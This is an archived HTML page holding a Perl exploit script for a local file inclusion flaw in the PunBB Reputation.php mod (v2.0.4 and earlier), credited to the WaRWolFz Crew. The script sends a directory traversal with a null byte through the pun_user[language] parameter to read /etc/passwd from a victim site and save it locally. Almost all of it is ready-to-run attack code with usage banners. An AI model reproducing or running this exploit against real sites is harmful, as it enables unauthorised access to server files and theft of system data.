<html><head><title>PunBB Reputation.php Mod <= 2.0.4 Local File Inclusion Exploit</title></head><pre>#!/usr/bin/perl
#[0-Day] PunBB Reputation.php Mod &lt;= v2.0.4 Local File Inclusion Exploit
#Coded By Dante90, WaRWolFz Crew
#Bug Discovered By: Dante90, WaRWolFz Crew
#register_globals = On
#magic_quotes_gpc = On


use LWP::UserAgent;
use HTTP::Cookies;
use strict;

my $EtcPasswd;
my $TransversalDirectory = &quot;./../../../../&quot;; #Transversal Directory
my $LFI = &quot;etc/passwd&quot;; #File Inject
my $HostName = &quot;http://www.victime_site.org/path/&quot;; #Insert Victime Web Site Link

my $Referrer = &quot;http://www.warwolfz.com/&quot;;

my $Cookies = new HTTP::Cookies;
my $UserAgent = new LWP::UserAgent(
			agent =&gt; 'Mozilla/5.0',
			max_redirect =&gt; 0,

			cookie_jar =&gt; $Cookies,
		) or die $!;

sub Local_File_Inclusion{
	my ($Directory,$Command) = @_;
	return &quot;./include/reputation/rep_profile.php?pun_user[language]=${Directory}${Command}%00&quot;;

}

my $Get = $UserAgent-&gt;get($HostName.Local_File_Inclusion($TransversalDirectory,$LFI));

if ($Get-&gt;content =~ /No such file or directory in/i){
	refresh($HostName, &quot;Exploit Filed&quot;);
	print &quot; * Error extracting sensible data.\n&quot;;

	print &quot; * Exploit Failed                                     *\n&quot;;
	print &quot; ------------------------------------------------------ \n\n&quot;;
}else{
	$EtcPasswd = $Get-&gt;content;
	open ( FILE , &quot;&gt;WaRWolFz.html&quot; ) or die $!;

	print FILE $EtcPasswd;
	close ( FILE );
	refresh($HostName, &quot;File Saved&quot;);
	print &quot; * Exploit Successed                                  *\n&quot;;
	print &quot; ------------------------------------------------------\n\n&quot;;

	system(&quot;pause&quot;);
}

sub usage{
	system(&quot;cls&quot;);
	{
		print &quot; \n [0-Day] PunBB Reputation.php Mod &lt;= v2.0.4 Local File Inclusion Exploit\n&quot;;
		print &quot; ------------------------------------------------------ \n&quot;;

		print &quot; * USAGE:                                             *\n&quot;;
		print &quot; * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n&quot;;
		print &quot; * perl name_exploit.pl                               *\n&quot;;

		print &quot; ------------------------------------------------------ \n&quot;;
		print &quot; *         Powered By Dante90, WaRWolFz Crew          *\n&quot;;
		print &quot; * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n&quot;;

		print &quot; ------------------------------------------------------ \n&quot;;
	};
	exit;
}

sub refresh{
	system(&quot;cls&quot;);
	{
		print &quot; \n [0-Day] PunBB Reputation.php Mod &lt;= v2.0.4 Local File Inclusion Exploit\n&quot;;

		print &quot; ------------------------------------------------------ \n&quot;;
		print &quot; * USAGE:                                             *\n&quot;;
		print &quot; * cd [Local Disk]:\\[Directory Of Exploit]\\           *\n&quot;;

		print &quot; * perl name_exploit.pl                               *\n&quot;;
		print &quot; ------------------------------------------------------ \n&quot;;
		print &quot; *         Powered By Dante90, WaRWolFz Crew          *\n&quot;;

		print &quot; * www.warwolfz.org - dante90_founder[at]warwolfz.org *\n&quot;;
		print &quot; ------------------------------------------------------ \n&quot;;

	};
	print &quot; * Victime Site: &quot; . $_[0] . &quot;\n&quot;;
	print &quot; * Etc/Passwd: &quot; . $_[1] . &quot;\n&quot;;
}

#WaRWolFz

# milw0rm.com [2009-07-30]</pre></html>